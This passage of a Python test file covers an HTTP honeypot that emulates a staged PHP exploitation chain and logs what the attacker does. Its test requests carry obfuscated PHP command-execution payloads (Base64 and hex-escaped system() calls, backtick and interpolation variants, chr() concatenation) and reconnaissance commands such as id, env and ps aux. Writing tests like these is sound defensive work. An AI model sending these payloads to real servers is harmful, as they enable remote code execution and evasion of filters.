        f"Content-Length: 16384\r\n\r\n"
    ).encode("utf-8") + stage2_body

    proto2, dec2, _ = handler.handle(stage2_req, session_id="198.51.100.101:40001")
    assert proto2 == "http/php2shell"
    meta2 = _parse_audit_metadata(dec2)
    assert meta2["stage"] == "STAGE_2_OOM_TRIGGER"

    # Step 2: 攻击者切换到代理 IP 2，请求无 .php 后缀的 POST /login，不带 PHPSESSID，
    # 在 X-Requested-With 和 Cookie 中携带 Base64 / Hex 混淆载荷
    b64_cmd = base64.b64encode(b"<?php system('id; whoami'); ?>").decode()
    followup_req = (
        f"POST /login HTTP/1.1\r\n"
        f"Host: laravel.local\r\n"
        f"X-Requested-With: {b64_cmd}\r\n"
        f"Cookie: custom_token=\\x73\\x79\\x73\\x74\\x65\\x6d('uname -a')\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: 7\r\n\r\n"
        f"login=1"
    ).encode("utf-8")

    proto3, dec3, resp3 = handler.handle(followup_req, session_id="203.0.113.202:40002")
    assert proto3 == "http/php2shell"
    assert b"uid=33(www-data)" in resp3
    assert b"www-data" in resp3
    assert b"Linux ubuntu-web01" in resp3

    meta3 = _parse_audit_metadata(dec3)
    assert meta3["attack_id"] == meta2["attack_id"]
    assert meta3["stage"] == "STAGE_3_UAF_RCE"
    assert meta3["path"] == "/login"


def test_concurrent_race_condition_flood_and_http_pipelining():
    """
    验证缺陷 4 修复：
    1. 并发竞争型攻击（交替狂发 Stage 2 污染包与 Stage 3/4 消费包）时，attack_state.current_stage
       保持单调递增，不会被后续到达的 Stage 2 污染包重置回退。
    2. 同一连接使用 HTTP Pipelining 连续快速发送多个粘包请求（Stage 2 + Stage 3 粘在同一个 TCP 读缓冲中）时，
       蜜罐会自动切分多个请求、分别推进 step_index 并合并响应，不丢包不漏记。
    """
    handler = HTTPHandler()
    boundary = "----RaceFloodBoundary"

    stage2_body = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
        f'|O:8:"stdClass":1:{{s:1:"x";i:1;}}\r\n'
        f"--{boundary}--\r\n"
    ).encode("utf-8")
    stage2_req = (
        f"POST /index.php HTTP/1.1\r\n"
        f"Host: target.local\r\n"
        f"Cookie: PHPSESSID=race_sid_2026\r\n"
        f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
        f"Content-Length: {len(stage2_body)}\r\n\r\n"
    ).encode("utf-8") + stage2_body

    stage3_body = b"uaf_trigger=1&cmd=id;echo+RACE_WIN"
    stage3_req = (
        f"POST /index.php HTTP/1.1\r\n"
        f"Host: target.local\r\n"
        f"Cookie: PHPSESSID=race_sid_2026\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {len(stage3_body)}\r\n\r\n"
    ).encode("utf-8") + stage3_body

    # 1. 测试 HTTP Pipelining：将 Stage 2 与 Stage 3 粘包一次性送入 handle()
    pipelined_stream = stage2_req + stage3_req
    proto_pipe, dec_pipe, resp_pipe = handler.handle(
        pipelined_stream, session_id="198.51.100.77:55000"
    )
    assert proto_pipe == "http/php2shell"
    assert b"HTTP/1.1 500 Internal Server Error" in resp_pipe
    assert b"HTTP/1.1 200 OK" in resp_pipe
    assert b"uid=33(www-data)" in resp_pipe
    assert b"RACE_WIN" in resp_pipe

    meta_pipe = _parse_audit_metadata(dec_pipe)
    assert meta_pipe["pipelined_count"] == 2
    assert meta_pipe["pipelined_stages"] == ["STAGE_2_OOM_TRIGGER", "STAGE_3_UAF_RCE"]
    assert meta_pipe["stage"] == "STAGE_3_UAF_RCE"
    assert meta_pipe["current_stage"] == "STAGE_3_UAF_RCE"
    assert meta_pipe["step_index"] == 2

    # 2. 随后并发脚本中的另一个线程又发来一个滞后的 Stage 2 污染包，验证 current_stage 不会从 STAGE_3 回退到 STAGE_2
    _, dec_late_s2, _ = handler.handle(stage2_req, session_id="198.51.100.77:55001")
    meta_late = _parse_audit_metadata(dec_late_s2)
    assert meta_late["stage"] == "STAGE_2_OOM_TRIGGER"  # 当前包本身是 Stage 2
    assert meta_late["current_stage"] == "STAGE_3_UAF_RCE"  # 整体攻击状态保持在 Stage 3 不回退


def test_deformed_payloads_and_extended_recon_commands():
    """
    验证缺陷 5 修复：
    1. 支持反引号命令执行（`<?php echo `id`; ?>`）
    2. 支持 PHP 双引号变量/命令插值（`"${system('whoami')}"`、`"{${`uname -a`}}"`）
    3. 支持十六进制转义字符串（`\\x73\\x79\\x73\\x74\\x65\\x6d`）与 `chr()` 拼接
    4. 支持实战高频环境探测命令回显：`cat /proc/version`、`cat /proc/cpuinfo`、`env`、
       `ip addr`、`ifconfig`、`ps aux`、`which curl wget`
    """
    handler = HTTPHandler()

    # 构造包含多种变形语法与全部新增环境探测命令的请求
    chr_system = ".".join(f"chr({ord(c)})" for c in "system")
    deformed_code = (
        '<?php '
        'echo `id`; '
        '$a = "${system(\'whoami\')}"; '
        '$b = "{${`cat /proc/version`}}"; '
        '\\x73\\x79\\x73\\x74\\x65\\x6d("cat /proc/cpuinfo; env"); '
        f"{chr_system}('ip addr; ifconfig; ps aux; which curl wget'); "
        '?>'
    )
    body = f"payload={deformed_code}".encode("utf-8")
    req = (
        f"POST /index.php HTTP/1.1\r\n"
        f"Host: target.local\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {len(body)}\r\n\r\n"
    ).encode("utf-8") + body

    proto, decoded, resp = handler.handle(req, session_id="198.51.100.88:61234")
    assert proto == "http/php2shell"
    resp_text = resp.decode("utf-8", errors="replace")

    # 校验反引号与插值命令输出
    assert "uid=33(www-data)" in resp_text
    assert "www-data" in resp_text
    # 校验新增环境探测命令回显
    assert "Linux version 6.8.0-45-generic" in resp_text
    assert "Intel(R) Xeon(R) Platinum" in resp_text
    assert "SERVER_SOFTWARE=nginx/1.18.0" in resp_text
    assert "172.17.0.2/16" in resp_text
    assert "RX packets" in resp_text
    assert "php-fpm: pool www" in resp_text
    assert "/usr/bin/curl" in resp_text
    assert "/usr/bin/wget" in resp_text

    meta = _parse_audit_metadata(decoded)
    assert meta["stage"] == "STAGE_3_UAF_RCE"
    for expected_cmd in (
        "id",
        "whoami",
        "cat /proc/version",
        "cat /proc/cpuinfo",
        "env",
        "ip addr",
        "ifconfig",
        "ps aux",
        "which curl wget",
    ):
        assert expected_cmd in meta["extracted_commands"]


